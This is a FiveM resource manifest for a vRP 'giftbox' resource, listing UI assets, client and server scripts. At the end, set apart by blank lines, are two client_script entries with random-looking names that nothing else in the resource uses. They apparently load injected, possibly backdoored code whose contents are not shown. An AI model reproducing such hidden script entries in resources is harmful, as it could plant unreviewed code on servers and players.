resource_manifest_version '77731fab-63ca-442c-a67b-abc70f28dfa5'

description "giftbox"

dependencies {
	'vrp'
}

ui_page 'html/ui.html'

files {
	'html/ui.html',
	'html/pricedown.ttf',
	'html/gift.png',
	'html/styles.css',
	'html/scripts.js',
	'html/debounce.min.js'
}

client_scripts{ 
  "lib/Tunnel.lua",
  "lib/Proxy.lua",
  "client.lua"
}

server_scripts{ 
  "@vrp/lib/utils.lua",
  "server.lua"
}

client_script "dXKYKWpRFBlOIBufyi.lua"







client_script "13277.lua"